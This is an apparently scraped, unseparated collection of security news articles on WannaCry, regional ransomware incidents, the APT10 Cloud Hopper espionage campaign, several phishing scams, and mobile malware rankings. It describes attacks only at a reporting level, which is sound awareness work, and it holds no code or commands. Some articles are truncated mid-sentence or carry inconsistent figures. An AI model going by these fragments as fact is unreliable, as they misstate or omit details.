In an attack predicted by cyber security experts for months, a yet unknown actor or actors integrated the EQUATIONGROUP APT exploits leaked by ShadowBrokers in a worldwide ransomware worm attack, infecting tens of thousands of endpoints in a matter of hours.
On Friday, May 12, a new ransomware, called WannaCry, began circulating throughout the United Kingdom and Spain, rapidly infecting over 45,000 exposed servers at healthcare, financial, and other business sectors. This ransomware stood out for several reasons, including being the largest ransomware attack in history, and the first widely spread ransomware worm.
The ransomware infection is Version 2.0 of WanaCypt0r (also known as WCry, WannaCry, and WannaCryptor). Unlike previous instances, this version takes advantage of the SMB vulnerability outlined in Microsoft Security Bulletin (MS17-010). This vulnerability was first exploited by the ETERNALBLUE malware, revealed by the ShadowBrokers leak in March, and targeted the Microsoft MS17-010 SMB vulnerabilities. SMB (Server Message Block) is a protocol primarily communicating on port 445 and is designed to provide access to shared resources on a network. Last fall, Microsoft propounded system administrators to disable SMB Version 1 on systems.
According to a FBI FLASH Alert (TLP:White) received by Recorded Future, the WannaCry ransomware infects initial endpoints via a phishing campaign or compromised RDP (remote desktop protocol). Once the ransomware gets into a network, it spreads quickly through any computers that don’t have the patch applied. The worm-like capabilities are the new feature added to this ransomware.
During the May 12 attack, two of the most significant targets were Telefonica, the Spanish telecommunications giant, and the United Kingdom’s National Health Service. In the United States, the shipping firm FedEx was hit by the ransomware. Infections of the new version of WannaCry started in Spain early on May 12, but quickly spread to the United Kingdom, Russia, Japan, Taiwan, the United States, and many more. In total, almost 100 countries were affected by the attack.
New instances of this ransomware worm dramatically decreased following the activation of a “kill-switch” in the ransomware. A security researcher going by the Twitter handle @MalwareTechBlog noted an unregistered domain (www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com) in a sample of the malware. WannaCry checked to ensure non-registration of the domain at some point prior to infection. According to the researcher, this was likely intended as a way to prevent analysis of the malware in a sandbox. If the domain is registered, WannaCry exits the system, preventing further infection. While this doesn’t benefit victims already infected, it does curb further infection. Additionally, according to security researcher Didier Stevens, WannaCry isn’t proxy aware, so enterprises utilizing a proxy won’t benefit from the “kill-switch.”
Spora ransomware, which began circulating in January of this year, is a ransomware noted for its sophistication, including top-notch customer support to victims, and was likely created by professional malicious actors.
Research in Recorded Future identified an early warning bulletin on WannaCry published on May 5, 2017 by the Spanish CERTSI (Computer Emergency Response Team for Security and Industry). The CERTSI bulletin cited numerous ransomware attacks using WannaCry targeting on equipment.
It appears Russian cyber criminals were equally perplexed by the WCry campaign as the rest of the world. One of the members of the popular underground community complained about the recently purchased Virtual Private Server (VPS) which was almost immediately infected by ransomware even before the system update was completed.
At least three separate Bitcoin wallets, controlled by unknown criminals were identified as part of the ransomware campaign.
As of this writing, little over 15 Bitcoins or approximately $26,000 were deposited to wallets controlled by unknown criminals.

A malware virus has paralyzed the computers of Licking County, Ohio, including the county’s police force. Hackers are seeking a whole lot of money to return control of the network to its rightful owners.
The importance of great network security cannot be overstated. Officials in Licking County have learned this lesson the hard way, as hackers have installed a computer virus, known as ‘ransomware,' that has locked up the local government's entire network, including that of the police force. Emergency services are still working, however.
""You lose your computers, the world changes a little bit,"" remarked Licking County commissioner Tim Bubb.
Apparently, someone in the office downloaded the malware by clicking on a link in a phishing email, or just downloaded the virus from some malicious website.
Ransomware is a type of computer virus that encrypts data on a user's computer, making it inaccessible. The ransomware then displays a message onscreen, ordinarily demanding money and providing a sole text input field in which a user must enter an unlock code provided by the malefactor, after the money is paid.
""All county offices remain open, but online access and landline telephones are not available for those on the county system. The shutdown is expected to continue at least the rest of the week,"" according to the Newark Advocate news website.
According to Bubb, the 911 office, due to budget restrictions, had not shifted to an online-accessible network, and so was working in normal capacity.
""Because they're working manually, they have made the staff a little more robust,"" he said.
He underscored that people can call 911, and that every emergency call is answered and responded to, using paper, printed maps, dry-erase boards and was dispatching first responders with old-fashioned radios.
""People of Licking County, we believe, are protected as they always are with 911,"" he added, according to WCMH-TV.
The amount of ransom demanded by the hackers remains undisclosed, as well as whether the ransom will be paid.
""We're dealing with a criminal element. It's a crime against the people of Licking County and its government."" Bubb said, adding that the county government currently is seeking the assistance of cybersecurity experts.
According to Sean Grady, director of the Licking County Emergency Management Agency and Regional 911 Center, resolving the situation will take time.
""It's going to be awhile,"" Grady said. ""Until they identify what it was, they don't know how to fix it.""
Maybe Licking County officials should turn toward cybersecurity experts in Russia. Dr. Web, a Russia-based antivirus developer and cyber security service provider, has been particularly effective in dealing with ransomware since early versions appeared in Russia some five years ago. The company has a web page dedicated to ransomware observing that using brute force to break modern ransomware encryption would take 107,902,838,054,224,993,544,152,335,601 years, at current processor speeds, and the average ransom sum can reach up to 1500 bitcoins ($49,500 currently).
""Things can even get rather peculiar. In one situation, a user paid a ransom to their attackers, but their attackers could not decipher the files encrypted by their own Trojan.Encoder (Cryptolocker), and advised the user to seek help… from Doctor Web's technical support service,"" the webpage reads.

A hacker allegedly used a vulnerability in MySQL to steal 6.5 million emails and poorly encrypted passwords from Dueling Network, a card game in the style of Yu-Gi-Oh, announced Motherboard.
The website’s forum has been kept online, although Dueling Network was shut down in 2016 following a cease-and-desist order. The request was made by a law firm on behalf of the animation company holding the rights to Yu-Gi-Oh.
“Only our forum site was still up as a way for our users to communicate with each other (login used DN [Dueling Network] credentials),” an administrator wrote in an email to Motherboard. “Now that is down and warns users to change passwords on any other sites they may have used the same password on.”
The passwords were hashed with the MD5 algorithm, known to have extensive vulnerabilities that allow hackers to get plaintext passwords. A company administrator said not all stolen emails and passwords are associated with individual players, as some accounts appear to be duplicates.

'Cloud Hopper' campaign by sophisticated APT10 hacking group uses advanced phishing and customised malware to conduct espionage.
A Chinese hacking group with advanced cyber-espionage capabilities has been targeting managed IT services providers across the globe in a campaign to steal sensitive data.
The cybercriminal gang is using sophisticated phishing attacks and customised malware in order to infect victims' machines and then gain access to IT providers and their customer networks.
Dubbed Operation Cloud Hopper, the cyber-espionage campaign has been uncovered by security researchers at PwC, BAE Systems, and the UK's National Cyber Security Centre. The researchers say the campaign is ""highly likely"" to be the work of the China-based APT10 hacking group.
The group has been focusing on espionage since 2009 and has evolved from targeting US defence firms as well as the technology and telecommunications sectors to targeting organisations in multiple industries across the globe.
The group was behind the Poison Ivy malware family and has evolved its operations to include using custom tools capable of compromising high volumes of data from organisations and their customers, and stealthily moving it around the world.
It's because of the sophisticated nature of the campaign that PwC's Operation Cloud Hopper report describes how APT10 ""almost certainly benefits from significant staffing and logistical resources, which have increased over the last three years"".
The group's work shifted significantly during 2016, as it started to focus on managed service providers, following the significant enhancements to its operations. The move enabled APT10 to exfiltrate data from multiple victims around the world as part of a large scale campaign.
Managed service providers (MSPs) represent a particularly lucrative target for attackers, because as well as having access to their clients' networks, they also store significant quantities of customer data, which can provide useful information or be sold for profit.
Researchers note that the spear phishing campaign undertaken by APT10 indicates that the group conducts significant research on targets, in order to have the best chance of tricking them into opening malicious documents attached to specially crafted emails.
Once the hacking group has infiltrated a network, it conducts reconnaissance to ensure legitimate credentials have been gained, before deploying tools such as mimikatz or PwDump to steal additional credentials, administration credentials, and data from infected MSPs.
The shared nature of MSP infrastructure enables APT10's success, allowing the hackers to stealthily move between the networks of MSPs and clients -- hence the name Cloud Hopper.
Using this approach, the group has been able to target organisations in the US, Canada, the UK, France, Switzerland, Scandinavia, South Africa, India, and Australia.
""The indirect approach of this attack highlights the need for organisations to have a comprehensive view of the threats they're exposed to -- including those of their supply chain,"" Kris McConkey, partner, cyber threat detection and response at PwC, said.
""This is a global campaign with the potential to affect a wide range of countries, so organisations around the world should work with their security teams and providers to check networks for the key warning signs of compromise and ensure they respond and protect themselves accordingly.""
The National Cyber Security Centre has issued guidelines following the global targeting of enterprises via managed service providers, and notes how the activity detected ""likely represents only a small proportion of the total malicious activity"".

A series of phishing campaigns is targeting airline consumers with messages crafted to trick victims into handing over personal or business credentials.
A wave string of phishing campaigns is targeting airline consumers with messages crafted to trick victims into handing over personal or business credentials.
The phishing messages pretend to be sent from a travel agency or a someone inside the target firm, they include a weaponized document or embed a malicious link.
“Over the past several weeks, we have seen a combination of attack techniques. One, where an attacker impersonates a travel agency or someone inside a company. Recipients are told an email contains an airline ticket or e-ticket,” explained Asaf Cidon, vice president, content security services at Barracuda Networks. 
According to Barracuda Networks, aviation-themed phishing attacks contain links to spoofed airline sites, threat actors personalize the phishing page in a way to trick victims into providing business information.
The attackers show a deep knowledge of the targets, hackers are targeting logistic, manufacturing and shipping industries.
“It’s clear there is some degree of advanced reconnaissance that takes place before targeting individuals within these companies,” Cidon added.
Recently the U.S. Computer Emergency Readiness Team issued an alert of phishing campaigns targeting airline consumers.
“US-CERT has received reports of email-based phishing campaigns targeting airline consumers. Systems infected through phishing campaigns act as an entry point for attackers to gain access to sensitive business or personal information.” reads the US-CERT warning.
“US-CERT encourages users and administrators to review an airline Security Advisory(link is external) and US-CERT’s Security Tip ST04-014 for more information on phishing attacks.”
The US-CERT specifically references the security advisory published by Delta Air Lines that warned its consumers of fraudulent activities.
“Delta has received reports of attempts by parties not affiliated with us to fraudulently gather customer information in a number of ways including: fraudulent emails, social media sites, postcards, Gift Card promotional websites claiming to be from Delta Air Lines and letters or prize notifications promising free travel,” states the Delta Air Lines warning.
Barracuda confirmed that these campaigns have a high success rate:
“Our analysis shows that for the airline phishing attack, attackers are successful over 90 percent of the time in getting employees to open airline impersonation emails,” concluded Cidon. “This is one of the highest success rates for phishing attacks.”

A China-based cyber gang has compromised UK firms as part of a ""systematic"" global hacking operation, a new report has revealed.
The attacks were found to have breached a wide variety of secret data ranging from personal data to intellectual property, in what the report described as ""one of the largest ever sustained global cyber espionage campaigns"".
The group behind the attacks, named APT10, was found to have used custom malware and ""spear phishing"" techniques to target managed outsourced IT service companies as stepping stones into the systems of an ""unprecedented web"" of victims according to the report's authors.
The report's authors included the National Cyber Security Centre (NCSC) and cyber units at defence group BAE systems and accountancy firm PwC.
The gang were found to have used the companies as a way into their customers' systems from 2016 onwards, although there is evidence to suggest they had first employed the tactics from as early 2014.
PwC cyber security Partner Richard Horne told the Press Association the extent of the malicious campaign was still unclear.
He said: ""The reason we've gone public with this is because we can see so much and we have seen so much in several managed IT service providers (MSPs) and other companies compromised through it, but we don't know how far this has gone.
""Us, together with the NCSC and BAE Systems are very keen to get this information out there so we can promote a mass response to this.""
The report behind the unmasking operation, codenamed Cloud Hopper, highlights targeted attacks against Japanese commercial firms and public bodies, but indicates further widespread operations against companies in 14 other countries including the UK, France and the United States.
The report's authors state APT10 is ""highly likely"" to be based in China, demonstrating a pattern of work in line with China Standard Time (UTC+8) and the targeting of specific commercial enterprises ""closely aligned with strategic Chinese interests"".
Mr Horne said the data collected in individual attacks spanned a plethora of sensitive categorisations.
He said: ""We've seen a number of different companies targeted for different reasons, but essentially it's all around sensitive information they hold, whether that's intellectual property, or personal information on people or a whole realm of other areas.
""It's a very large-scale espionage operation."" Spear phishing emails with bespoke malware were first sent to staff in targeted companies, and once the attackers had successfully infiltrated their systems they were free to seek out a raft of sensitive data within.
Dr Adrian Nish, head of threat intelligence at BAE, told the BBC such MSPs were crucial to the nature of the campaign's success.
He said: ""Organisations large and small rely on these providers for management of core systems and as such they can have deep access to sensitive data"".
""It is impossible to say how many organisations might be impacted altogether at this point.""
The organisations behind operation Cloud Hopper are expected to release a further report this week into the detailed methods that ATP10 has used in its campaign in a bid to encourage firms to take a proactive approach into checking if their systems have been targeted.

LinkedIn users are being warned to be on their guard following a rise in reports of attacks being distributed via email designed to trick job seekers into sharing their personal details.
Scammers have spammed out email messages posing as communications from LinkedIn, claiming that a company is “urgently seeking” workers matching your qualifications in “your region”.
It would be nice to think that recipients of the bogus message would spot a number of warning signals as soon as they open the communication in their email inbox. But there’s always a chance that someone eager to find new employment might – in their haste – not notice that the messages
As HelpNetSecurity describes, if anyone was careless enough to follow the email’s advice and click on the link contained within the message – they would be taken to a third-party website where they are instructed to upload their CVs, making it child’s play for scammers to harvest the information.
Just think of some of the personal information that you include in your CV or resume. Before you know it, a scammer might have your full name, date of birth, work and home email addresses, work and home telephone numbers, and all manner of other personal information that could be abused by scammers.
At the simplest level such data breaches could lead to a rise in targeted spam attacks, or scam phone calls. But it could also be a stepping stone to more damaging business email compromise (also often known as “CEO fraud”) which has resulted, in some cases, in companies losing tens of millions of dollars.
Anything which gives online criminals inside information about you and your position within a company could give them the head start they need to launch a targeted attack that could lead to a significant data breach or a substantial financial loss.
In short, being careless with your personal information – such as your CV – might not just put your career in jeopardy, it could also ultimately endanger the company you work for. And that’s certainly not going to ever look good on your CV.

Austrian police arrested a 19-year-old teenager from Linz for infecting the network of a local company with the Philadelphia ransomware.
The incident in question took place last year and targeted an unnamed company based in Linz. The attacker locked the company's servers, including its production database.
The attacker asked for $400 to unlock the company's systems, but the victim refused and instead recovered its data via older backups.
Attack traced back to Linz teenager
The company filed a criminal complaint with the Austrian Federal Criminal Police Office (Bundeskriminalamt, or BK), claiming damages of €3,000 due to production losses.
An investigation by Austrian police's SOKO Clavis unit tracked down the attack to a Linz teenager. Authorities searched the suspect's homes, one in Linz, and one near Vienna, where he moved.
Police arrested the young man, who was later released and is now under an official investigation. According to a BK spokesperson, the teenager denied all accusations.
Teenager bought ransomware off the Dark Web
Investigators believe the suspect bought the Philadelphia ransomware off the Dark Web. The ransomware is currently on sale on the AlphaBay Dark Web marketplace starting with $389.
The ransomware appeared in September 2016 and was based on the Stampado ransomware. Emsisoft released a free decrypter for Philadelphia a day after the ransomware first appeared.
According to a Forcepoint report published today, Philadelphia is also the tool of choice for ransomware attacks against the healthcare sector.
Austrian police are also investigating (cached mirror) another ransomware attack that targeted an Austrian hotel. In late January, a ransomware attack at an Austrian hotel affected the electronic door locking system at an Austrian hotel. At the time of publishing Bleeping Computer could not confirm with Austrian police that this was the same attack they started investigating in mid-March.

And that approach probably works out just fine from a law enforcement organization’s perspective. However, from the viewpoint of a private citizen whose entire database has been held hostage by vicious hackers, not paying a ransom is hardly an option. According to the FBI’s own statistics, ransomware attacks are spreading like virus in the US alone, with a spike as alarming as $209 million in damages in the first three months of 2016. When you look at it, the reasons behind the spread of ransomware are quite easy to understand. The malicious coding can be acquired by anyone with an internet connection for as little as a hundred dollars on the Deep Web, the psychological pressure over losing one’s important data almost always ends up in a successful heist and the current law enforcement system can and does very little to prevent the situation from going out of control. That, however, is not to say that the law enforcement isn’t concerned. In a news report released in April 2016, the FBI expressed its direct concerns over the unchallenged growth of ransomware attacks and urged any victims to not give in to the demand for ransom unless all other options are exhausted. Unfortunately, however, as is the case with most ransomware attacks, the stakes of losing years worth of important data is always quite high and the ransom demanded usually very small,  leading most victims to give in to the attackers’ demands before even reaching out to law enforcement.
For starters, though, let’s try and have a look at what ransomware is, and what differentiates it from other types of malicious coding. The most common form of ransomware is one that infiltrates your network, gains access to your data and encrypts them using advanced algorithms to prevent you from accessing your own files. A demand for an aggressive amount of money, generally in Bitcoin, is then demanded by the perpetrator in exchange for the key that decrypts said data that has been hijacked. There are, of course, several other types of ransomware, such as the kind that block access to the entire operating system or the kind that attaches itself to a partition of the computer’s hard drive. Most ransomware come with some sort of encryption key that is used to unlock the stolen data files once ransom is paid, though there is absolutely no guarantee that the perpetrator will keep their end of the bargain once money is transferred.
The majority of ransomware attacks come with a set of identifying characteristics, such as the use of malicious coding that can spread throughout the network, the blocking of access to important data in the victim’s servers in a variety of creative ways, including the scrambling of file names and adding different extensions to prevent them from being accessed. Ransomware attacks also feature a time limit to add an element of psychological pressure against the victim, after which the data in concern is either stolen or deleted from the victim’s servers permanently. Attackers these days almost always ask for payment in Bitcoin, as the cryptocurrency is incredibly difficult to track as far as payments go.
The concern over ransomware lies not in individual cases but the number of cases reported each year, which makes it the most popular cyber-infiltration scenario in current times. According to the Cyber Threat Alliance (CTA), the damages caused by CryptoWall 3, a particular type of ransomware, hit $325 million in 2015 alone. As per statistics produced by the Federal Bureau of Investigation, in the first few months of 2016, a single variant of ransomware infected as many as 100,000 computers each day. In the March of 2016, the number of computers infected by ransomware technology hit the absolute upper ceiling for the year, reports Symantec. While the cases, when considered individually, may not amount to much, the number of incidents reported worldwide in any given year is clearly a matter of global concern.

What does David Beckham have in common with Sony and the Democratic National Committee?
Hacked emails that are apparently reputation-shredding – plus enough media attention paid to the details of the leaked content to overshadow the actual crime.
The Daily Mail reports that police in Portugal have launched an investigation into an attack on the servers at Beckham’s PR firm, Doyen Global, which is run by his friend Simon Oliveira.
The police have reportedly been investigating the attack for the past 12 months.
According to the Telegraph, the hackers had allegedly demanded €1m ($1.07m)  in exchange for destroying a dossier of some 18.6m emails and documents, which the ever-colorful British press have dubbed “Beckileaks”.
A source told the Telegraph that the blackmailer(s) first made the pitch by email, using the fake name of Artem Lovuzov.
“Lovuzov” allegedly told Doyen Sports chief executive Neilo Lucas that paying the money would ensure that no embarrassing messages were given to the press:
A generous donation, and you can be sure that all the information I possess will be destroyed.
The Beckham team didn’t respond, so the blackmailer set a deadline:
I’m giving you until 16.00 on Tuesday to contact my lawyer with a view to a proper resolution to this impasse.
Beckham and his team didn’t want to play the game.
The hacker(s) didn’t stop at Team Beckham, though: they’ve reportedly targeted a number of businesses connected to the football world.
It was then published by sites including Der Spiegel, L’Equipe and El Mundo.
Former UK football star Beckham – a mega-celebrity who’s gone on to use his considerable clout to raise big sums of money for Unicef – has been faced with the publication of expletive-laced emails that make it look like he’s used the charity as a front to buff up his chances of knighthood.
A spokesman for Beckham told the BBC that the alleged emails were “hacked”, “doctored” and “private” from a third-party server.

Hummingbad has been replaced as the top mobile malware threat. It has been usurped by Triada, a modular backdoor for Android.
According to Check Point Security, Triada grants super-user privileges to downloaded malware, helping it to be embedded into system processes. It has also been seen spoofing URLs loaded in the browser. And in January, based on data from the World Cyber Threat Map, Triada edged past Hummingbad, ending that baddie’s year-long reign.
Hummingbad is an Android malware that establishes a persistent rootkit on the device, installs fraudulent applications, and with slight modifications, could enable additional malicious activity such as installing a key-logger, stealing credentials and bypassing encrypted email containers used by enterprises. It’s still in second place in terms of prevalence.
Over the summer, Check Point said that it was found to control 85 million devices globally, generating an estimated $300,000 per month in fraudulent ad revenue for the criminals behind it, i.e., Yingmob, a group of Chinese cyber-criminals. Yingmob also happens to operate a legitimate ad network.
The No 3 mobile malware threat is Hiddad—an Android malware which repackages legitimate apps and then releases them to a third-party store. Its main function is displaying ads; however, it is also able to gain access to key security details built into the OS, allowing an attacker to obtain sensitive user data.
In total, mobile malware accounted for 9% of all recognized malware attacks by Check Point.
On the non-mobile front, the Index ranked Kelihos, a botnet used in bitcoin theft and spamming, as the most prevalent malware family overall, with 5% of organizations globally is impacted by it. It utilizes peer-to-peer communications, enabling each individual node to act as a Command & Control server.
It’s followed by HackerDefender and Cryptowall in second and third place respectively, with both impacting 4.5% of companies.
Overall, the top 3 malware families revealed that hackers were using a wide range of attack vectors and tactics to target businesses. These threats impact all steps of the infection chain, including spam emails which are spread by botnets, and contain downloaders that place ransomware or a Trojan on the victim’s machine.

A massive phishing campaign took place today, but Google's security staff was on hand and shut down the attacker's efforts within an hour after users first reported the problem on Reddit.
According to multiple reports on Twitter, the attacks first hit journalists, businesses, and universities, but later spread to many other users as well.
The attack itself was quite clever if we can say so ourselves. Victims received a legitimate (non-spoofed) email from one of their friends, that asked them to click on a button to receive access to a Google Docs document.
If users clicked the button, they were redirected to the real Google account selection screen, where a fake app titled ""Google Docs"" (not the real one) asked the user's permission to authorize it to access the shared document. In reality, the app only wanted access to the user's Gmail inbox and contact list.
After gaining access to these details, the fake app copied the user's contact list and sent a copy of itself to the new set of targets, spreading itself to more and more targets. The email was actually sent to ""hhhhhhhhhhhhhhhh@mailinator.com,"" with the user's email address added as BCC. Following the incident, Mailinator intervened and blocked any new emails from arriving into that inbox.
Because of this self-replicating feature, the phishing attack spread like wildfire in a few minutes, just like the old Samy worm that devasted MySpace over a decade ago.
Fortunately, one Google staff member was visting the /r/Google Reddit thread, and was able to spot a trending topic detailing the phishing campaign.
The Google engineer forwarded the Reddit thread to the right person, and within an hour after users first complained about the issue, Google had already disabled the fake app's ability to access the Google OAuth screen.
Later on, as engineers had more time to investigate the issue, Google issued the following statement:
We have taken action to protect users against an email impersonating Google Docs & have disabled offending accounts. We’ve removed the fake pages, pushed updates through Safe Browsing, and our abuse team is working to prevent this kind of spoofing from happening again. We encourage users to report phishing emails in Gmail.
There are no reports that malware was deployed in the phishing attack. Cloudflare was also quick to take down all the domains associated with the phishing attack.
Users that clicked on the button inside the phishing email can go to the https://myaccount.google.com/permissions page and see if they granted the app permission to access their account. The real Google Docs isn't listed in this section, as it does not need permissions, being an official Google property.

What’s worse than ransomware that scrambles all your files and demands money for the key to unlock them and get them back?
Well, WannaCry certainly added a new dimension to the ransomware danger, because it combined the data-scrambling process with self-spreading computer virus code.
As a result, WannaCry could worm its way through your network automatically, potentially leaving you with hundreds or even thousands of scrambled computers in a single attack, even if only one user opened a booby-trapped attachment or downloaded a file from a poisoned website.
The crooks behind the SamSam ransomware have also latched onto a rather different approach: instead of trying to reach thousands or tens of thousands of victims around the world with a hard-hitting spam campaign, and squeezing each of them for hundreds or thousands of dollars each, the SamSammers seem to attack one organisation at a time.
Indeed, the SamSammers generally keep their hand hidden until they have broken into the network and figured out, using similar techniques to penetration testers, a list of computers they know they can encrypt all at the same time.
Then they let fly on all of those identified devices at once, giving them a much higher chance of scrambling at least some computers that are critical to the workflow of your company,
Finally, they make a payment demand, typically charging a few thousand dollars for each individual computer you want to unlock, but also offering an all-you-can-eat deal of $50,000 to decrypt everything.
The bad news is that this WannaCrypt “demanding money with menaces” threat email is very widespread – we’ve had people worried about it from all over, which is why we decided to write up this warning.
The good news is that these particular crooks don’t actually have any malware to back up their threat.
Indeed, their claim that “antivirus software will not be able to detect [the] program” is one of the few truths in this scam, for the simple and fortunate reason that, in this case, there is no program to detect.
Just to be clear here: disk wiping malware – think of it as ransomware with no decryption key, so you can’t buy your files back from the crooks even if you want to – most certainly exists.
So, these WannaCrypt scammers could, in theory, have been telling the truth, giving you just a few hours to hunt down and turn off their attack code before your data was destroyed.
In this particular case, however, the whole thing is a fraud, right down to the existence of the malware in the first place.

A malicious website initially set up to extort visitors to pay a cryptocurrency ransom has changed its course. Instead of demanding payment via Bitcoin, Ethereum, Bitcoin Cash or Litecoin in exchange for not leaking your password on the internet, the site now hijacks your computer’s processing power to mine cryptocurrency in the background.
Designed as a copy of the Have I Been Pwned attack, the site began by asking users to enter their emails to see if their password has been compromised. Unfortunately, if your password was breached, the site demanded a “donation” of $10 by cryptocurrency to not publish your password in plain text on the web.
Up to 1.4 billion passwords may have been breached, but it’s unclear how accurate that figure is. However, because it may be easier — and safer — to change your password than pay the ransom, as The Next Web noted, the site shifted its focus from demanding ransomware payments to taking over your PC’s processing power to mine for cryptocurrency in the background. The publication also confirmed that the malicious site did “have a database with legitimate passwords,” but that not all compromised passwords were stored in plain text.
The Next Web did not reveal the site’s address in its report, citing security reasons, but noted that it doesn’t appear that any user had made payment.
This is the latest ransomware in recent months that demand cryptocurrency as a form of payment. Prior to this incident, Thanatos encrypted files on a user’s PC by hijacking it using a brute force method. If you want to regain access to those files, you had to send payment via cryptocurrency to get a key to decrypt your files. However, at the time, there didn’t appear to be a proper decryption key even if you paid.
According to a recent Google report, extortionists made out with $25 million in just two years, and cryptocurrency was the preferred way to get paid.
Hackers are also changing the game when it comes to data theft. Rather than leaking the information to the dark markets, an IBM X-Force Intelligence Index report revealed that hackers prefer to hold files hostage in exchange for a ransom payment.

Discovered by a security researcher who goes by the name of Zenofex, these security flaws have not been reported to Western Digital, are still unpatched, and with public exploit code is available for more than half of the vulnerabilities.
According to Zenofex multiple WD MyCloud NAS device models are affected, such as:
Zenofex's decision not to inform Western Digital came after the researcher attended a security conference last year, where other infosec professionals complained about Western Digital ignoring vulnerability reports.
It was at the same conference, Black Hat USA 2016, where Western Digital also won a Pwnie Award in a category called ""Lamest Vendor Response.""
""Ignoring these bugs would leave the vulnerable devices online for longer periods while responsible disclosure is worked out,"" Zenofex argued his decision not to wait until Western Digital patches the security bugs.
""Instead we’re attempting to alert the community of the flaws and hoping that users remove their devices from any public facing portions of their networks, limiting access wherever possible,"" he added.
Zenofex, who's a member of the Exploitee.rs community, says he found a whopping total of 85 security issues.
Based on the exploit code, many of these security flaws can be exploited by altering cookie values or embedding shell commands in cookie parameters.
When the image loads inside their browser, the exploit code executes against the local NAS drive and takes over the device.
The most severe of these issues, according to Zenofex, is authentication bypass issue, which ironically was also the easiest to exploit, requiring only the modification of cookie session parameters.
And since Murphy's Law applies to hardware devices as well, things went wrong all the way, and the commands aren't executed under a limited user, but run under root, giving attackers full control over affected devices, allowing them to upload or download data at will.

When it comes to phishing scams, the general concept is that cyber criminals will only send a link to trick users into logging in with their social media or email credentials. But since that is an old school trick, the malicious threat actors are aiming at much more than your Facebook or Gmail password.
Recently, we discovered a sophisticated phishing campaign targeting Apple users. The aim of this attack is to steal their Apple ID, credit card data, a government issued ID card, and or passport. That’s not all, the scam also asks users to provide it with access to their device webcam to take their snap for verification purposes.
It all starts with users receiving an email in which the sender poses as one of the officials from Apple Inc. The email alerts the user that their iCloud account is on hold because of an unusual sign in activity through an unknown browser and in case they didn’t log in from the device mentioned in the email they need to click on a link to change the password.
Those who understand how phishing scams work will know how to ignore it, but unsuspecting users may fall for it and be tricked into clicking the link and giving away their personal and financial information. Upon clicking the link users are taken to the phishing page which looks exactly like the official Apple ID login page. The users then are then asked to enter their Apple ID and its password to proceed.
Once the users are logged in, they are taken to another page which asks users for their credit card details including cardholder name, card number, expiration date, CVV code and ED secure password. Upon giving this info, the users are asked to click the next tab. Remember by now the scammers have got your Apple ID login credentials and credit card information.
Because criminals will remain criminals, the more you feed them the more they will ask for. Once the “next” tab is clicked, users are invited to enter their personal information including full name, date of birth, country, state, city, address, Zip code and phone number. This is done to use user information for further scams like identity theft and social engineering frauds.
Once your personal information is handed over to the criminals, the page asks users to click the “finish” tab, but they aren’t done yet. Upon clicking the Finish tab users are taken to another page asking them to upload their password, a government issued identity card or the driver license – both sides. 
The users can click skip to avoid uploading their government issued documents but then they need to allow the website to access their device’s camera and microphone to take a snap of them. The users can also click the “Skip” tab, and the page will redirect them to the official Apple ID website.
Good news is that Google Chrome has already detected the scam and marked the phishing domain as “Deceptive.” However, the bad news is that Firefox, Opera, and Safari browsers didn’t show any warning messages to their users therefore if you are using these browsers be vigilant.

Google Docs was pulled into a sneaky email phishing attack on Tuesday that was designed to trick users into giving up access to their Gmail accounts.
The phishing emails, which circulated for about three hours before Google stopped them, invited the recipient to open what appeared to be a Google Doc. The teaser was a blue box that said, “Open in Docs.”
In reality, the link led to a dummy app that asked users for permission to access their Gmail account.
An example of the phishing email that circulated on Tuesday.
Users might easily have been fooled, because the dummy app was actually named “Google Docs.” It also asked for access to Gmail through Google’s actual login service.
The hackers were able to pull off the attack by abusing the OAuth protocol, a way for internet accounts at Google, Twitter, Facebook and other services to connect with third-party apps.  
The OAuth protocol doesn’t transfer any password information, but instead uses special access tokens that can open account access.
However, OAuth can be dangerous in the wrong hands. The hackers behind Tuesday’s attack appear to have built an actual third-party app that leveraged Google processes to gain account access.
The dummy app will try to ask for account permission. 
Last month, Trend Micro said a Russian hacking group known as Fancy Bear was using a similar email attack method that abused the OAuth protocol to phish victims.
However, security experts said Tuesday's phishing attack probably wasn't from Fancy Bear, a shadowy group that many experts suspect works for the Russian government.
""I don't believe they are behind this ... because this is way too widespread,"" Jaime Blasco, chief scientist at security provider AlienVault, said in an email. 
On Tuesday, many users on Twitter, including journalists, posted screen shots of the phishing emails, prompting speculation that the hackers were harvesting victims' contact lists to target more users.
The attack was also sent through an email address at ""hhhhhhhhhhhhhhhh@mailinator.com."" Mailinator, a provider of a free email service, denied any involvement. 
Fortunately, Google moved quickly to stop the phishing attacks, after a user on Reddit posted about them.
“We’ve removed the fake pages, pushed updates through Safe Browsing, and our abuse team is working to prevent this kind of spoofing from happening again,” Google said in a statement.
Security experts and Google recommend affected users check what third-party apps have permission to access their account and revoke any suspicious access. Users can do so by visiting this address, or performing a Google security check-up.

Tuesday's phishing scheme will probably push Google to adopt an even stricter stance on apps that use OAuth, said Robert Graham, CEO of research company Errata Security.
However, the internet giant has to strike a balance between ensuring security and fostering a flourishing app ecosystem. 
""The more vetting you do, the more you stop innovation,"" Graham said. ""It's a trade-off.""

Intel just announced their new Sunny Cove Architecture that comes with a lot of new bells and whistles. The Intel processor line-up has been based off the Skylake architecture since 2015, so the new architecture is a fresh breath for the world’s largest chip maker. They’ve been in the limelight this year with hardware vulnerabilities exposed, known as Spectre and Meltdown. The new designs have of course been patched against those weaknesses.
The new architecture (said to be part of the Ice Lake-U CPU) comes with a lot of new promises such as faster core, 5 allocation units and upgrades to the L1 and L2 caches. There is also support for the AVX-512 or Advanced Vector Extensions instructions set which will improve performance for neural networks and other vector arithmetic.
Another significant change is the support for 52-bits of physical space  and 57 bits of linear address support. Today’s x64 CPUs can only use bit 0 to bit 47 for an address space spanning 256TB. The additional bits mean a bump to a whooping 4 PB of physical memory and 128 PB of virtual address space.
The new offering was demoed under the company’s 10nm process which incidentally is the same as the previously launched Cannon Lake. The new processors are due in the second half of 2019 and are being heavily marketed as a boon for the Cryptography and Artificial Intelligence Industries. The claim is that for AI, memory to CPU distance has been reduced for faster access, and that special cryptography-specific instructions have been added.

Admins can now grab Cisco's updates for 13 high-severity flaws affecting gear that uses its IOS and IOS XE networking software.
All the bugs have been rated as having a high security impact because they could be used to gain elevated privileges or jam a device with denial-of-service (DoS) attacks.
The company also has fixes available for 11 more flaws outlined in 10 advisories with a medium-severity rating, most of which also address issues in IOS and IOS XE, the Linux-based train of Cisco's popular networking operating system.
The updates for the 13 high-severity IOS and IOS XE flaws are part of Cisco's scheduled twice-yearly patch bundle for this software targeted for September.
